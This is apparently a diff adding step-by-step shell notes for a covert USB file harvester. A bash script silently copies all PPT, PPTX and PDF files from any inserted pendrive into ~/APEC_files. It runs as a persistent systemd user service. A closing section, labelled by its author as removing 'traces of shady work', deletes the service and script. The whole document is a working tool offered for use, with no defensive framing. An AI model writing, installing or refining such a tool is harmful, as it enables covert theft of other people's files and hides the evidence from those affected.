@@ -1,0 +1,93 @@
+1.mkdir -p ~/.local/bin
+2.nano ~/.local/bin/apec_usb_ppt_watcher.sh
+3. =====SCRIPT=========
+=======================================================
+#!/bin/bash
+
+set -u
+
+USER_NAME="${USER:-$(id -un)}"
+DEST="$HOME/APEC_files"
+mkdir -p "$DEST"
+
+declare -A SEEN
+
+copy_from_mount() {
+    local mount_point="$1"
+    [ -d "$mount_point" ] || return 0
+
+    local drive_name
+    drive_name="$(basename "$mount_point")"
+
+    find "$mount_point" -type f \( -iname "*.ppt" -o -iname "*.pptx" -o -iname "*.pdf" \) -print0 2>/dev/null |
+    while IFS= read -r -d '' src; do
+        rel="${src#"$mount_point"/}"
+        target="$DEST/$drive_name/$rel"
+
+        mkdir -p "$(dirname "$target")"
+        cp -n -- "$src" "$target" 2>/dev/null
+    done
+}
+
+while true; do
+    declare -A CURRENT=()
+
+    for base in "/media/$USER_NAME" "/run/media/$USER_NAME"; do
+        [ -d "$base" ] || continue
+
+        while IFS= read -r -d '' mount_point; do
+            CURRENT["$mount_point"]=1
+
+            if [[ -z "${SEEN[$mount_point]+x}" ]]; then
+                copy_from_mount "$mount_point"
+                SEEN["$mount_point"]=1
+            fi
+        done < <(find "$base" -mindepth 1 -maxdepth 1 -type d -print0 2>/dev/null)
+    done
+
+    for old_mount in "${!SEEN[@]}"; do
+        if [[ -z "${CURRENT[$old_mount]+x}" ]]; then
+            unset 'SEEN[$old_mount]'
+        fi
+    done
+
+    sleep 2
+done
+====================================
+
+4.sed -i 's/\r$//' ~/.local/bin/apec_usb_ppt_watcher.sh
+5.chmod +x ~/.local/bin/apec_usb_ppt_watcher.sh
+=======USER SERVICE======
+6. mkdir -p ~/.config/systemd/user
+7.nano ~/.config/systemd/user/apec-usb-ppt-watcher.service
+8.=========userconfig==========
+[Unit]
+Description=Watch USB mounts and copy PPT/PPTX files to ~/APEC_files
+After=default.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash %h/.local/bin/apec_usb_ppt_watcher.sh
+Restart=always
+RestartSec=2
+
+[Install]
+WantedBy=default.target
+==============================
+
+9.systemctl --user daemon-reload
+10. systemctl --user enable --now apec-usb-ppt-watcher.service
+11. systemctl --user status apec-usb-ppt-watcher.service
+12. test the script is running before inserting pendrive(run the script for 5-10 secs and then hit ctrl+C)
+=======/bin/bash ~/.local/bin/apec_usb_ppt_watcher.sh====
+m1. find ~/APEC_files -type f \( -iname "*.ppt" -o -iname "*.pptx" \)  (TO find the copied files)
+13. systemctl --user stop apec-usb-ppt-watcher.service (stop right now)
+14. systemctl --user disable --now apec-usb-ppt-watcher.service (to stop and prevetn from future auto turn on)
+=======above 2 commands to disable the service=====
+15. systemctl --user enable --now apec-usb-ppt-watcher.service ( to turn on later)
+16. ====To remove the traces of shady work compleltely from system======
+systemctl --user disable --now apec-usb-ppt-watcher.service
+rm -f ~/.config/systemd/user/apec-usb-ppt-watcher.service
+rm -f ~/.local/bin/apec_usb_ppt_watcher.sh
+systemctl --user daemon-reload
+=======================
